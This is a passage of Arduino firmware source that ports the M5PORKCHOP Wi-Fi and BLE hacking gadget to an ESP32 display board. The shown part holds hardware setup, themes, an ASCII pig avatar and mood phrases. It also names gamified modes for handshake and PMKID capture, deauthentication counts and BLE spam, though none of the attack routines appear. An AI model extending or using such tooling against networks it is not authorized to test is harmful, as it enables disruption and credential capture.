// ============================================================
// M5PORKCHOP → CYD (ESP32-2432S028R) FAITHFUL PORT  v5
// Original: https://github.com/0ct0sec/M5PORKCHOP by 0ct0
// CYD Port: faithfully adapted from full source
//
// Hardware: ESP32-2432S028R "Cheap Yellow Display" (Elegoo variant)
//   ILI9341 2.8" 320x240 TFT  HSPI: MOSI=13 CLK=14 CS=15 DC=2 RST=-1
//   XPT2046 touch              VSPI: CLK=25 MISO=39 MOSI=32 CS=33 IRQ=36
//   Backlight GPIO 21 HIGH     RGB LED active-LOW: R=4 G=16 B=17
//   SD card CS=5               GPS: RX=22 TX=27 (Serial2, optional)
//
// Arduino IDE Board: ESP32 Dev Module
//   Partition: Huge APP (3MB No OTA / 1MB SPIFFS)
//
// Required Libraries:
//   TFT_eSPI by Bodmer (configure with User_Setup.h)
//   XPT2046_Touchscreen by Paul Stoffregen
//   TinyGPSPlus by Mikal Hart
// ============================================================

#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>
#include <SD.h>
#include <SPI.h>
#include <Preferences.h>
#include <SPIFFS.h>
#include <time.h>
#include <string.h>
#include <Arduino.h>

// Extra includes for full port
#include <vector>
#include <atomic>
// NimBLE — install "NimBLE-Arduino" by h2zero in Library Manager for PIGGY BLUES mode
// If not installed, PIGGY BLUES will be stubbed out
#if __has_include(<NimBLEDevice.h>)
  #include <NimBLEDevice.h>
  #include <NimBLEAdvertising.h>
  #define NIMBLE_AVAILABLE 1
#else
  #define NIMBLE_AVAILABLE 0
#endif

// Optional GPS
#define GPS_ENABLED false
#if GPS_ENABLED
  #include <TinyGPS++.h>
#endif

// ============================================================
// CYD PIN DEFINITIONS
// ============================================================
#define TFT_BL_PIN    21   // Backlight (active HIGH)
#define LED_R_PIN     4    // RGB LED Red (active LOW)
#define LED_G_PIN     16   // RGB LED Green (active LOW)
#define LED_B_PIN     17   // RGB LED Blue (active LOW)
#define SD_CS_PIN     5

// Touch (VSPI)
#define TOUCH_CS_PIN  33
#define TOUCH_IRQ_PIN 36
#define TOUCH_CLK_PIN 25
#define TOUCH_MISO_PIN 39
#define TOUCH_MOSI_PIN 32

// GPS (Serial2) - optional
#define GPS_RX_PIN    22
#define GPS_TX_PIN    27
#define GPS_BAUD      9600

// ============================================================
// DISPLAY LAYOUT  (320x240 landscape — scaled from 240x135)
// Original used 240×135 with TOP_BAR=14, BOTTOM_BAR=14, MAIN=107
// CYD: we scale proportionally to 320×240:
//   TOP_BAR=20, BOTTOM_BAR=20, MAIN=200
// ============================================================
#define DISPLAY_W     320
#define DISPLAY_H     240
#define TOP_BAR_H     20
#define BOTTOM_BAR_H  20
#define MAIN_H        (DISPLAY_H - TOP_BAR_H - BOTTOM_BAR_H)

// ============================================================
// THEME SYSTEM (15 themes, matching original exactly)
// ============================================================
struct PorkTheme {
  const char* name;
  uint16_t fg;
  uint16_t bg;
};

#define THEME_COUNT 15
const PorkTheme THEMES[THEME_COUNT] = {
  {"P1NK",      0xF92A, 0x0000},
  {"CYB3R",     0x07E0, 0x0000},
  {"PCMDR64",   0xDED5, 0x4A4A},
  {"MSD0SEXE",  0xFFE0, 0x001F},
  {"AMB3R",     0xFDA0, 0x0000},
  {"BL00D",     0xF800, 0x0000},
  {"GH0ST",     0xFFFF, 0x0000},
  {"N0STR0M0",  0x4A4A, 0x0000},
  {"PAP3R",     0x0000, 0xFFFF},
  {"BUBBLEGUM", 0x0000, 0xF92A},
  {"M1NT",      0x0000, 0x07E0},
  {"SUNBURN",   0x0000, 0xFDA0},
  {"L1TTL3M1XY",0x0360, 0x95AA},
  {"B4NSH33",   0x27E0, 0x0000},
  {"M1XYL1TTL3",0x95AA, 0x0360},
};

// ============================================================
// MODE ENUM (matching original)
// ============================================================
enum class PorkchopMode : uint8_t {
  IDLE = 0,
  OINK_MODE,
  DNH_MODE,
  WARHOG_MODE,
  PIGGYBLUES_MODE,
  SPECTRUM_MODE,
  MENU,
  SETTINGS,
  CAPTURES,
  ACHIEVEMENTS,
  ABOUT,
  FILE_TRANSFER,
  CRASH_VIEWER,
  DIAGNOSTICS,
  SWINE_STATS,
  BOAR_BROS,
  WIGLE_MENU,
  UNLOCKABLES,
  BOUNTY_STATUS,
  BACON_MODE,
  SD_FORMAT,
  CHARGING
};

// ============================================================
// AVATAR STATES (matching original)
// ============================================================
enum class AvatarState : uint8_t {
  NEUTRAL = 0, HAPPY, EXCITED, HUNTING, SLEEPY, SAD, ANGRY
};

// ============================================================
// GLOBAL INSTANCES
// ============================================================
TFT_eSPI tft = TFT_eSPI();
TFT_eSprite mainSprite = TFT_eSprite(&tft); // Main content area sprite

// Touch on custom VSPI pins (CLK=25, MISO=39, MOSI=32, CS=33)
SPIClass touchSPI(VSPI);
XPT2046_Touchscreen touch(TOUCH_CS_PIN, TOUCH_IRQ_PIN);

// SD uses the default Arduino SPI object (VSPI default pins: CLK=18, MISO=19, MOSI=23, CS=5)
// This avoids conflicting with touchSPI which has been re-pinned to 25/39/32
// No SPIClass needed — SD.begin() uses SPI directly

#if GPS_ENABLED
TinyGPSPlus gps;
#endif

Preferences prefs;

// WebUI — soft AP + raw screen stream
// Connect to "PORKCHOP" WiFi, browse to 192.168.4.1
#define WEBUI_AP_SSID   "PORKCHOP"
#define WEBUI_AP_PASS   ""           // open network
#define WEBUI_PORT      80
WiFiServer webServer(WEBUI_PORT);
static bool webUIActive = false;

// ============================================================
// CONFIG / STATE
// ============================================================
struct Config {
  uint8_t themeIndex   = 0;
  uint8_t brightness   = 80;
  char callsign[16]    = "";
  char pigName[16]     = "PORKCHOP";
} cfg;

PorkchopMode currentMode = PorkchopMode::IDLE;
static uint8_t achScroll     = 0;     // Achievements screen scroll offset
static uint8_t achDetailIdx  = 0;     // Achievements detail popup: selected index
static bool    achDetailShow = false; // Achievements detail popup: visible
static uint8_t swineTab      = 0;     // Swine Stats tab: 0=ST4TS 1=B00STS 2=W1GL3
static uint8_t menuScroll = 0;  // Menu scroll offset
static uint8_t menuSel    = 0;  // Menu selected row (absolute index)
static bool capShowChallengesFlag = false;  // CAPTURES screen: false=loot, true=challenges

// ── HOG ON SPECTRUM — state (static, no heap) ─────────────────────────────
#define SPEC_W        280    // spectrum draw width (px), starts at x=20
#define SPEC_LEFT     20     // left margin for dB labels
#define SPEC_TOP      0      // top of spectrum area (in sprite)
#define SPEC_BOT      110    // bottom of spectrum (baseline)
#define WFALL_ROWS    40     // waterfall history rows
#define WFALL_TOP     112    // waterfall top (in sprite)
static const float SINC_LUT[45] = {
  0.0000f,0.0650f,0.1100f,0.1300f,0.1100f, 0.0650f,0.0000f,0.0900f,0.1500f,0.1800f,
  0.1500f,0.0000f,0.1700f,0.2700f,0.3300f, 0.3700f,0.5000f,0.6500f,0.8000f,0.9100f,
  0.9700f,0.9950f,1.0000f,
  0.9950f,0.9700f,0.9100f,0.8000f,0.6500f, 0.5000f,0.3700f,0.3300f,0.2700f,0.1700f,
  0.0000f,0.1500f,0.1800f,0.1500f,0.0900f, 0.0000f,0.0650f,0.1100f,0.1300f,0.1100f,
  0.0650f,0.0000f
};
static int8_t  specBuf[SPEC_W];
static int8_t  specPeak[SPEC_W];
static uint8_t wfallBuf[WFALL_ROWS][SPEC_W];
static uint8_t wfallRow = 0;
static uint32_t wfallLastMs = 0;
static uint32_t specEnterMs = 0;  // When we entered SPECTRUM_MODE (for N13TZSCH3 ach)
static uint16_t specNoiseState = 0xACE1;
static inline uint8_t specNoise() {
  specNoiseState ^= specNoiseState<<7; specNoiseState ^= specNoiseState>>9;
  specNoiseState ^= specNoiseState<<8; return specNoiseState & 0x07;
}
static inline float specSincAmp(float dist) {
  float p = dist + 22.0f;
  if (p<0||p>44) return 0;
  int i=(int)p; float f=p-i;
  return (i>=44)?SINC_LUT[44]:SINC_LUT[i]+f*(SINC_LUT[i+1]-SINC_LUT[i]);
}
static inline int specFreqToX(float freq, float viewCtr) {
  // 13 channels = 12*5 = 60MHz span, fixed view
  return SPEC_LEFT + (int)((freq - (viewCtr-30.0f)) * SPEC_W / 60.0f);
}
static inline int specRssiToY(int8_t rssi) {
  rssi = (rssi<-95)?-95:(rssi>-30)?-30:rssi;
  return SPEC_BOT - (int)(((float)(rssi+95)/65.0f)*(SPEC_BOT-SPEC_TOP));
}
static float specViewCtr = 2437.0f;  // default ch6
static int   specSelIdx  = -1;       // selected network index
static bool  specMonMode = false;    // client monitor active
static uint8_t specMonBssid[6] = {};
uint32_t bootTime = 0;
bool sdAvailable = false;

// WiFi scan state
bool scanInProgress = false;
uint16_t networkCount = 0;
uint32_t lastScanTime = 0;
#define SCAN_INTERVAL_MS 8000

// Network list (simple - no full OinkMode logic)
struct DetectedNet {
  char ssid[33];
  int8_t rssi;
  uint8_t channel;
  uint8_t authmode;
};
#define MAX_NETS 40
DetectedNet nets[MAX_NETS];
uint16_t netTotal = 0;

// Captures tracking
uint16_t handshakeCount = 0;
uint32_t deauthCount = 0;

// GPS state
bool gpsHasFix = false;
float gpsLat = 0, gpsLon = 0;
float gpsSpeedKmh = 0;
uint8_t gpsSats = 0;

// ============================================================
// COLOR HELPERS
// ============================================================
inline uint16_t colorFG() {
  uint8_t idx = cfg.themeIndex < THEME_COUNT ? cfg.themeIndex : 0;
  return THEMES[idx].fg;
}
inline uint16_t colorBG() {
  uint8_t idx = cfg.themeIndex < THEME_COUNT ? cfg.themeIndex : 0;
  return THEMES[idx].bg;
}

// ============================================================
// AVATAR — exact port of original art and animations
// ============================================================
namespace Avatar {

// Original ASCII frames (right-facing: snout 00 on right)
const char* FRAMES_R[7][3] = {
  {" ?  ? ", "(o 00)", "(    )"},  // NEUTRAL
  {" ^  ^ ", "(^ 00)", "(    )"},  // HAPPY
  {" !  ! ", "(@ 00)", "(    )"},  // EXCITED
  {" |  | ", "(= 00)", "(    )"},  // HUNTING
  {" v  v ", "(- 00)", "(    )"},  // SLEEPY
  {" .  . ", "(T 00)", "(    )"},  // SAD
  {" \\  / ", "(# 00)", "(    )"},  // ANGRY
};
// Left-facing frames (snout 00 on left, z pigtail)
const char* FRAMES_L[7][3] = {
  {" ?  ? ", "(00 o)", "(    )z"},
  {" ^  ^ ", "(00 ^)", "(    )z"},
  {" !  ! ", "(00 @)", "(    )z"},
  {" |  | ", "(00 =)", "(    )z"},
  {" v  v ", "(00 -)", "(    )z"},
  {" .  . ", "(00 T)", "(    )z"},
  {" \\  / ", "(00 #)", "(    )z"},
};

AvatarState state = AvatarState::NEUTRAL;
bool facingRight = true;
bool isBlinking = false;
bool isSniffing = false;
bool grassMoving = false;
bool grassDir = true;
int moodIntensity = 0;

// Position (scaled from original 240px wide to 320px wide)
// Original: LEFT=20, RIGHT=108. Scale factor ~1.33
// CYD:      LEFT=27, RIGHT=144
int currentX = 27;
bool onRightSide = false;

// Walk transition
bool transitioning = false;
uint32_t transStartTime = 0;
int transFromX = 27;
int transToX = 27;
bool transToRight = true;
static const uint32_t TRANS_MS = 1200;

// Blink/look timers
uint32_t lastBlinkTime = 0;
uint32_t blinkInterval = 4000;
uint32_t lastLookTime = 0;
uint32_t lookInterval = 3000;
uint32_t lastFlipTime = 0;
uint32_t flipInterval = 40000;

// Sniff
uint32_t sniffStartTime = 0;
uint8_t sniffFrame = 0;
static const uint32_t SNIFF_DURATION_MS = 600;

// Jump
bool jumpActive = false;
uint32_t jumpStartTime = 0;
static const int JUMP_HEIGHT = 12;
static const uint32_t JUMP_DURATION_MS = 600;

// Grass
char grassPattern[28] = {0};
uint32_t lastGrassUpdate = 0;
uint16_t grassSpeed = 80;

void init() {
  state = AvatarState::NEUTRAL;
  isBlinking = false;
  isSniffing = false;
  facingRight = true;
  lastBlinkTime = millis();
  blinkInterval = random(4000, 8000);
  lastLookTime = millis();
  lookInterval = random(3000, 8000);
  lastFlipTime = millis();
  flipInterval = random(25000, 50000);
  currentX = 27;
  onRightSide = false;
  grassMoving = false;
  for (int i = 0; i < 26; i++)
    grassPattern[i] = (random(0,2)==0) ? '/' : '\\';
  grassPattern[26] = '\0';
}

void setState(AvatarState s) { state = s; }
void setMoodIntensity(int i) { moodIntensity = i; }
bool isFacingRight() { return facingRight; }
bool isOnRightSide() { return onRightSide; }
bool isTransitioning() { return transitioning; }
int getCurrentX() { return currentX; }

void blink() { isBlinking = true; }
void sniff() { isSniffing = true; sniffStartTime = millis(); sniffFrame = 0; }
void cuteJump() { jumpActive = true; jumpStartTime = millis(); }

void setAttackShake(bool a, bool s) { (void)a; (void)s; }  // Visual only - omitted for CYD

void startSlide(int targetX, bool faceRight) {
  if (currentX == targetX) return;
  transitioning = true;
  transFromX = currentX;
  transToX = targetX;
  transToRight = faceRight;
  transStartTime = millis();
  facingRight = faceRight;
}

void updateGrass() {
  if (!grassMoving) return;
  uint32_t now = millis();
  if (now - lastGrassUpdate < grassSpeed) return;
  lastGrassUpdate = now;
  if (grassDir) {
    char last = grassPattern[25];
    for (int i = 25; i > 0; i--) grassPattern[i] = grassPattern[i-1];
    grassPattern[0] = last;
  } else {
    char first = grassPattern[0];
    for (int i = 0; i < 25; i++) grassPattern[i] = grassPattern[i+1];
    grassPattern[25] = first;
  }
  if (random(0,30)==0) {
    int pos = random(0,26);
    grassPattern[pos] = (random(0,2)==0) ? '/' : '\\';
  }
}

// Draw pig to mainSprite — sprite is MAIN_H tall (200px), 0-indexed
// Original drew to 107px sprite at textSize 3 (18px/char)
// CYD: textSize 3 = 18px/char, same. Positions scaled proportionally.
// Original startY=23 → CYD startY=43 (×200/107), lineHeight=22→22
void draw() {
  uint32_t now = millis();

  // Sniff timeout
  if (isSniffing) {
    if (now - sniffStartTime > SNIFF_DURATION_MS) {
      isSniffing = false; sniffFrame = 0;
    } else {
      sniffFrame = ((now - sniffStartTime) / 100) % 3;
    }
  }

  // Walk transition
  if (transitioning) {
    uint32_t elapsed = now - transStartTime;
    if (elapsed >= TRANS_MS) {
      transitioning = false;
      currentX = transToX;
      facingRight = transToRight;
      onRightSide = (currentX > 85);
    } else {
      float t = (float)elapsed / TRANS_MS;
      float smoothT = t*t*t*(t*(t*6.0f-15.0f)+10.0f);
      currentX = transFromX + (int)((transToX - transFromX) * smoothT);
    }
  }

  // Blink timer
  if (now - lastBlinkTime > blinkInterval) {
    isBlinking = true;
    lastBlinkTime = now;
    blinkInterval = random(4000, 8000);
  }

  // Look behavior (stationary only)
  if (!transitioning && !grassMoving) {
    if (now - lastLookTime > lookInterval) {
      int roll = random(0,100);
      if (roll < 35) facingRight = !facingRight;
      else if (roll < 55) { facingRight = !facingRight; }
      else if (roll < 70) { sniff(); }
      else if (roll < 82) { isBlinking = true; }
      lastLookTime = now;
      lookInterval = random(2000, 12000);
    }

    // Walk behavior
    if (now - lastFlipTime > flipInterval) {
      const int LEFT_EDGE = 27;
      const int RIGHT_EDGE = 144;
      int targetX = onRightSide ? LEFT_EDGE : RIGHT_EDGE;
      if (abs(targetX - currentX) > 15) {
        startSlide(targetX, targetX > currentX);
      }
      lastFlipTime = now;
      flipInterval = random(30000, 75000);
    }
  }

  // Jump timeout
  if (jumpActive && (now - jumpStartTime > JUMP_DURATION_MS)) jumpActive = false;

  // Calculate Y offset (jump/bounce)
  int shakeY = 0;
  if (jumpActive) {
    float t = (float)(now - jumpStartTime) / JUMP_DURATION_MS;
    float arc = 4.0f * t * (1.0f - t);
    shakeY = -(int)(arc * JUMP_HEIGHT);
  } else if (transitioning || grassMoving) {
    static const int bounce[4] = {0,-4,-1,-2};
    shakeY = bounce[(now/80)%4];
  }

  // Select frame
  int stateIdx = (int)state;
  if (stateIdx >= 7) stateIdx = 0;
  const char** frame = facingRight ? FRAMES_R[stateIdx] : FRAMES_L[stateIdx];

  bool shouldBlink = isBlinking && state != AvatarState::SLEEPY;
  isBlinking = false;

  // Draw to mainSprite
  mainSprite.setTextDatum(TL_DATUM);
  mainSprite.setTextSize(3);
  mainSprite.setTextColor(colorFG(), colorBG());

  int startX = currentX;
  int startY = 65 + shakeY;  // moved down from 43 to clear bubble zone above
  int lineHeight = 22;

  for (int i = 0; i < 3; i++) {
    if (i == 2) {
      // Body line with dynamic tail
      char bodyLine[16];
      bool tailOnLeft = false;
      if (facingRight) {
        strncpy(bodyLine, "z(    )", sizeof(bodyLine));
        tailOnLeft = true;
      } else {
        strncpy(bodyLine, "(    )z", sizeof(bodyLine));
      }
      int bodyX = tailOnLeft ? (startX - 18) : startX;
      mainSprite.drawString(bodyLine, bodyX, startY + i * lineHeight);
    } else if (i == 1 && (shouldBlink || isSniffing)) {
      char mod[16];
      strncpy(mod, frame[i], sizeof(mod)-1);
      mod[sizeof(mod)-1] = '\0';
      if (shouldBlink) {
        if (facingRight) mod[1] = '-';
        else mod[4] = '-';
      }
      if (isSniffing) {
        char n1, n2;
        switch (sniffFrame) {
          case 0: n1='o'; n2='o'; break;
          case 1: n1='o'; n2='O'; break;
          case 2: n1='O'; n2='o'; break;
          default: n1='o'; n2='o'; break;
        }
        if (facingRight) { mod[3]=n1; mod[4]=n2; }
        else { mod[1]=n1; mod[2]=n2; }
      }
      mainSprite.drawString(mod, startX, startY + i * lineHeight);
    } else {
      mainSprite.drawString(frame[i], startX, startY + i * lineHeight);
    }
  }

  // Draw grass
  updateGrass();
  mainSprite.setTextSize(1);
  mainSprite.setTextColor(colorFG(), colorBG());
  mainSprite.drawString(grassPattern, 0, 140);  // just below pig body
}

  // Grass accessor for display layer
  const char* getGrassPattern() { return grassPattern; }
  bool isGrassMoving()          { return grassMoving; }
  uint16_t getGrassSpeed()      { return grassSpeed; }
  bool isGrassDirectionRight()  { return grassDir; }

} // namespace Avatar

// Avatar helpers for mode subsystems
namespace Avatar {
  void setGrassMoving(bool m) { grassMoving=m; }
  void setGrassSpeed(uint16_t sp) { grassSpeed=sp; }
}

// Challenge types at global scope — needed by Mood, Display, and Challenges namespaces
enum class ChallengeType : uint8_t {
  NETWORKS_FOUND, HIDDEN_FOUND, HANDSHAKES, PMKIDS, DEAUTHS,
  GPS_NETWORKS, BLE_PACKETS, PASSIVE_NETWORKS, NO_DEAUTH_STREAK,
  DISTANCE_M, WPA3_FOUND, OPEN_FOUND
};
enum class ChallengeDifficulty : uint8_t { EASY=0, MEDIUM=1, HARD=2 };
struct ActiveChallenge {
  ChallengeType       type;
  ChallengeDifficulty difficulty;
  uint16_t target, progress, xpReward;
  char     name[32];
  bool     completed, failed;
};

// XPEvent at global scope — needed by Challenges fwd decl (used by Mood)
enum XPEvent : uint8_t {
  NETWORK_FOUND=0, NETWORK_HIDDEN, NETWORK_WPA3, NETWORK_OPEN, NETWORK_WEP,
  HANDSHAKE_CAPTURED, PMKID_CAPTURED, DEAUTH_SENT, DEAUTH_SUCCESS,
  WARHOG_LOGGED, BLE_APPLE, BLE_ANDROID, BLE_SAMSUNG, BLE_WINDOWS,
  DNH_NETWORK_PASSIVE, DNH_PMKID_GHOST, BLE_BURST, DISTANCE_KM
};

namespace Challenges {
  uint8_t getActiveCount();
  bool    getSnapshot(uint8_t idx, ActiveChallenge& out);
  void    generate();
  void    onXPEvent(XPEvent ev);
}

// ============================================================
// MOOD — phrase system (faithful port of all phrase arrays)
// ============================================================
namespace Mood {

#define SET_PHRASE(dst, src) do { strncpy((dst), (src), sizeof(dst)-1); (dst)[sizeof(dst)-1]='\0'; } while(0)

char currentPhrase[40] = "oink";
int happiness = 50;
uint32_t lastPhraseChange = 0;
uint32_t phraseInterval = 15000;
uint32_t lastActivityTime = 0;
int momentumBoost = 0;
uint32_t lastBoostTime = 0;
int lastEffectiveHappiness = 50;

// Phrase queue
char phraseQueue[4][40] = {{0},{0},{0},{0}};
uint8_t phraseQueueCount = 0;
uint32_t lastQueuePop = 0;
static const uint32_t PHRASE_CHAIN_DELAY_MS = 2000;

// Mood persistence
Preferences moodPrefs;

// Challenge hype state — bits 0-2 track which challenges were hyped at 80%+
static uint8_t challengeHypedFlags = 0;

static const char* const PHRASES_CHALLENGE_CLOSE[] = {
  "trial almost done. dont choke.",
  "so close bruv. PIG WATCHES.",
  "nearly there. pig stares.",
  "the demand is nearly met",
  "finish this. pig waits."
};
static const int PHRASES_CHALLENGE_CLOSE_COUNT = 5;

// --- PHRASE ARRAYS (verbatim from original) ---
const char* PHRASES_HAPPY_OINK[] = {
  "snout proper owns it","oi oi oi","got that truffle bruv",
  "packets proper nommin","hog on a mad one","mud life innit",
  "truffle shuffle mate","chaos tastes mint","right proper mood",
  "horse lookin better","sorted snout yeah"
};
const char* PHRASES_HAPPY_CD[] = {
  "snout feel irie","blessed oink vibes","got di truffle easy",
  "packets flow natural","hog inna good mood","mud life blessed",
  "truffle dance irie","chaos taste sweet","peaceful piggy seen",
  "horse find di way","jah guide di snout"
};
const char* PHRASES_HAPPY_WARHOG[] = {
  "tactical advantage secured","roger that truffle","mission parameters met",
  "packets inbound hooah","hog ready to deploy","operational status green",
  "intel acquisition positive","situational awareness high",
  "coordinates locked","barn perimeter secure","objective achieved"
};
const char* PHRASES_EXCITED_OINK[] = {
  "OI OI OI PROPER","PWNED EM GOOD MATE","TRUFFLE BAGGED BRUV",
  "GG NO RE INNIT","SNOUT GOES MAD","0DAY BUFFET YEAH",
  "PROPER BUZZING","SORTED PROPER"
};
const char* PHRASES_EXCITED_CD[] = {
  "BLESSED OINK VIBES","PWNED DEM IRIE","TRUFFLE BLESSED JAH",
  "GG RESPECT BREDREN","SNOUT FEEL DI POWER","0DAY BLESSED",
  "IRIE VIBES STRONG","JAH GUIDE DI WIN"
};
const char* PHRASES_EXCITED_WARHOG[] = {
  "MISSION ACCOMPLISHED","OSCAR MIKE BABY","TACTICAL SUPERIORITY",
  "HOOAH TRUFFLE DOWN","OBJECTIVE SECURED","ENEMY NEUTRALIZED",
  "ROGER WILCO SUCCESS","BRING THE RAIN"
};
const char* PHRASES_HUNTING[] = {
  "proper snouting","sniffin round like mad","hunting them truffles bruv",
  "right aggro piggy","diggin deep mate","oi where's me truffles"
};
const char* PHRASES_SLEEPY_OINK[] = {
  "knackered piggy","sod all happening","no truffles mate",
  "/dev/null init","zzz proper tired","dead bored bruv",
  "bugger all here","wasteland proper"
};
const char* PHRASES_SAD_OINK[] = {
  "starvin proper","404 no truffle mate","proper lost bruv",
  "trough bone dry","sad innit","need truffles bad",
  "bloody depressing","horse wandered off","proper gutted",
  "miserable piggy","a capture would fix this","snout needs a handshake"
};
const char* PHRASES_WARHOG[] = {
  "boots on ground","patrol route active","recon in progress sir",
  "moving through sector","surveying AO","oscar mike",
  "maintaining bearing","grid coordinates logged","securing perimeter data",
  "tactical recon mode","sitrep: mobile"
};
const char* PHRASES_MENU_IDLE[] = {
  "[O] truffle hunt","[W] hog out","[B] spam the ether",
  "[H] peek the spectrum","pick ur poison","press key or perish",
  "awaiting chaos","idle hooves...","root or reboot",
  "802.11 on standby","snout calibrated","kernel panik ready",
  "inject or eject","oink//null","promiscuous mode","sudo make bacon"
};
const char* PHRASES_SNIFFING[] = {
  "channel hoppin","raw sniffin","mon0 piggy","promisc mode",
  "beacon dump","frame harvest","airsnort vibes","ether tapping",
  "mgmt snooping","pcap or it didnt","0x8000 stalkin",
  "radiodump","passive recon"
};
const char* PHRASES_RARE[] = {
  "hack the planet","zero cool was here","the gibson awaits",
  "mess with the best","phreak the airwaves","big truffle energy",
  "oink or be oinked","sudo make sandwich","curly tail chaos",
  "snout of justice","802.11 mudslinger","wardriving wizard",
  "never trust a pig","pwn responsibly","horse ok today?",
  "horse found the k","barn still standing?","horse vibin hard",
  "miss u horse","horse WAS the barn","check on da horse"
};
const char* PHRASES_RARE_LORE[] = {
  "soup recipe avoided","4 lines between shame and glory",
  "found nothing. suspicious.","horse = barn (proven)",
  "malloc speaks russian","underwater. still compiling.",
  "spice must flow. pig agrees.","samurai ronin without context",
  "git log remembers everything","optometrist > ketamine",
  "k found horse again","barn structural integrity: ???",
  "embarrassment persists in commits","identity crisis: API edition",
  "codepath paranoia justified","sleep deprivation: features",
  "pig silent. pig sees all."
};
const char* PHRASES_OINK_QUIET[] = {
  "bloody ether's dead","sniffin sod all","no truffles here bruv",
  "channels proper empty","where's the beacons mate","dead radio yeah",
  "faraday cage innit","lonely spectrum proper","snout finds bugger all",
  "airwaves bone dry","chasin ghosts mate","802.11 wasteland"
};
const char* PHRASES_BORED[] = {
  "no bacon here","this place sucks","grass tastes bad",
  "wifi desert mode","empty spectrum","bored outta mind",
  "where da APs at","sniff sniff nada","0 targets found",
  "radio silence","tumbleweed.exe","802.11 wasteland",
  "where horse at","barn too quiet"
};

// Anti-repeat history (simple: track last phrase per category)
enum class PhraseCategory : uint8_t {
  HAPPY, EXCITED, HUNTING, SLEEPY, SAD, RARE, MENU_IDLE,
  SNIFFING, BORED, WARHOG, COUNT
};
int8_t phraseHistory[(int)PhraseCategory::COUNT][3];
uint8_t phraseHistIdx[(int)PhraseCategory::COUNT] = {0};
bool histInit = false;

void initHistory() {
  if (histInit) return;
  for (int c = 0; c < (int)PhraseCategory::COUNT; c++)
    for (int i = 0; i < 3; i++) phraseHistory[c][i] = -1;
  histInit = true;
}

int pickPhrase(PhraseCategory cat, int count) {
  if (count <= 0) return 0;
  initHistory();
  int catIdx = (int)cat;
  int idx, attempts = 0;
  do {
    idx = random(0, count);
    attempts++;
  } while (attempts < 10 && phraseHistory[catIdx][(phraseHistIdx[catIdx]+2)%3] == idx);
  phraseHistory[catIdx][phraseHistIdx[catIdx]] = idx;
  phraseHistIdx[catIdx] = (phraseHistIdx[catIdx] + 1) % 3;
  return idx;
}

void applyMomentumBoost(int amount) {
  momentumBoost = constrain(momentumBoost + amount, -50, 50);
  lastBoostTime = millis();
}

int getEffectiveHappiness() {
  uint32_t elapsed = millis() - lastBoostTime;
  if (elapsed >= 30000) momentumBoost = 0;
  else momentumBoost = (int)(momentumBoost * (1.0f - (float)elapsed / 30000.0f));
  lastEffectiveHappiness = constrain(happiness + momentumBoost, -100, 100);
  return lastEffectiveHappiness;
}

void saveMood() {
  moodPrefs.begin("porkmood", false);
  moodPrefs.putChar("mood", (int8_t)constrain(happiness, -100, 100));
  moodPrefs.putULong("time", millis());
  moodPrefs.end();
}

void init() {
  SET_PHRASE(currentPhrase, "oink");
  lastPhraseChange = millis();
  phraseInterval = 15000;
  lastActivityTime = millis();
  momentumBoost = 0;
  lastBoostTime = 0;
  phraseQueueCount = 0;
  initHistory();

  moodPrefs.begin("porkmood", true);
  int8_t savedMood = moodPrefs.getChar("mood", 50);
  uint32_t savedTime = moodPrefs.getULong("time", 0);
  moodPrefs.end();

  if (savedTime > 0) {
    happiness = savedMood + (50 - savedMood) / 4;
    const char* returns[] = {"pig waited. pig always waits.", "snout remembers. pig ready.", "back already bruv?"};
    SET_PHRASE(currentPhrase, returns[random(0,3)]);
  } else {
    happiness = 50;
  }
  lastEffectiveHappiness = happiness;
}

bool processQueue() {
  if (phraseQueueCount == 0) return false;
  uint32_t now = millis();
  if (now - lastQueuePop < PHRASE_CHAIN_DELAY_MS) return true;
  SET_PHRASE(currentPhrase, phraseQueue[0]);
  phraseQueueCount--;
  if (phraseQueueCount > 0)
    memmove(phraseQueue[0], phraseQueue[1], phraseQueueCount * sizeof(phraseQueue[0]));
  phraseQueue[phraseQueueCount][0] = '\0';
  lastQueuePop = now;
  lastPhraseChange = now;
  return phraseQueueCount > 0;
}

void queuePhrase(const char* p1, const char* p2 = nullptr, const char* p3 = nullptr) {
  phraseQueueCount = 0;
  if (p1 && phraseQueueCount < 4) { SET_PHRASE(phraseQueue[phraseQueueCount], p1); phraseQueueCount++; }
  if (p2 && phraseQueueCount < 4) { SET_PHRASE(phraseQueue[phraseQueueCount], p2); phraseQueueCount++; }
  if (p3 && phraseQueueCount < 4) { SET_PHRASE(phraseQueue[phraseQueueCount], p3); phraseQueueCount++; }
  lastQueuePop = millis();
}

// Challenge proximity hype — fires once per challenge when it hits 80%+
// Checks every 30s, gives a momentum boost and sets a pig hype phrase
static bool pickChallengePhraseIfDue(uint32_t now) {
  static uint32_t lastCheckMs = 0;
  if (now - lastCheckMs < 30000) return false;
  lastCheckMs = now;

  for (uint8_t i = 0; i < 3; i++) {
    ActiveChallenge ch = {};
    if (!Challenges::getSnapshot(i, ch)) continue;
    if (ch.completed || ch.failed) continue;
    if (ch.target == 0) continue;
    float pct = (float)ch.progress / (float)ch.target;
    if (pct >= 0.8f && !(challengeHypedFlags & (1 << i))) {
      challengeHypedFlags |= (1 << i);
      SET_PHRASE(currentPhrase, PHRASES_CHALLENGE_CLOSE[random(0, PHRASES_CHALLENGE_CLOSE_COUNT)]);
      applyMomentumBoost(10);
      lastPhraseChange = now;
      return true;
    }
  }
  // Reset hype flags for completed challenges so future ones can be hyped
  for (uint8_t i = 0; i < 3; i++) {
    ActiveChallenge ch = {};
    if (Challenges::getSnapshot(i, ch) && ch.completed)
      challengeHypedFlags &= ~(1 << i);
  }
  return false;
}

// Once-per-boot riddles (pig speaks in cryptic tongues in IDLE mode)
static const char* RIDDLES[][5] = {
  { "the killer logs all sins", "baud rate seals the pact", "pig judges in silence", "hit one. accept fate.", "dtr rts zero. pig endures." },
  { "snake coils at the port", "115200 heartbeats per breath", "pig stirs from the void", "unity unlocks the trials.", "dtr rts zero. pig endures." },
  { "silicon serpent enters", "monitor drinks the truth", "pig demands sacrifice", "lone digit starts the hunt.", "dtr rts zero. pig endures." },
  { "the cable binds you now", "serial mouth awaits words", "pig knows your intent", "first key. three trials.", "dtr rts zero. pig endures." },
  { "USB tongue finds socket", "killer counts in silence", "pig smells the worthy", "one begins the pact.", "dtr rts zero. pig endures." },
};
static const int RIDDLE_COUNT = 5;
static bool riddleShownThisBoot = false;
bool riddlePendingAch    = false;  // Unlock ACH_PROPHECY_WITNESS — checked in main loop

